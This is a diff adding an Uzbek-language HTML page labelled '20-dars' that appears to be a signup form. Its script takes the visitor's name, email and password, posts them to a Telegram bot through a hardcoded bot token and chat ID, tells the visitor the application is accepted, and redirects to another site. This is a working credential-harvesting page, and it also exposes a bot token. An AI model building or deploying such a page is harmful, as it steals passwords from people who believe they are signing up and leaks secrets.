@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>20-dars</title>
+  </head>
+  <body>
+    <form action="" method="get">
+      <label for="fname">Ismingiz: </label>
+      <input id="fname" type="text" />
+      <label for="email">Email: </label>
+      <input id="email" type="email" />
+      <label for="password">Parol: </label>
+      <input id="password" type="password" />
+      <button onclick="alicho()" type="submit">Submit</button>
+    </form>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+      function alicho() {
+        let fname = document.getElementById("fname").value;
+        let email = document.getElementById("email").value;
+        let password = document.getElementById("password").value;
+        event.preventDefault();
+        let telegram_bot_id = "7275500777:AAEaFHKmskZOpp22yzPzuIWOMdJTa9c8Jx0";
+
+        let chat_id = 6665877403;
+        let message = `Ismi: ${fname}; Email: ${email}; Parol: ${password}`;
+        let settings = {
+          async: true,
+          crossDomain: true,
+          url:
+            "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache",
+          },
+          data: JSON.stringify({
+            chat_id: chat_id,
+            text: message,
+          }),
+        };
+        $.ajax(settings).done(function (response) {
+          alert("ARIZANGIZ QABUL QILINDI TEZ O`RADA ALOQAGA CHIQAMIZ");
+          window.location.href = "https://qizil.netlify.app/";
+        });
+        document.getElementById("fname").value = "";
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+        return false;
+      }
+    </script>
+  </body>
+</html>
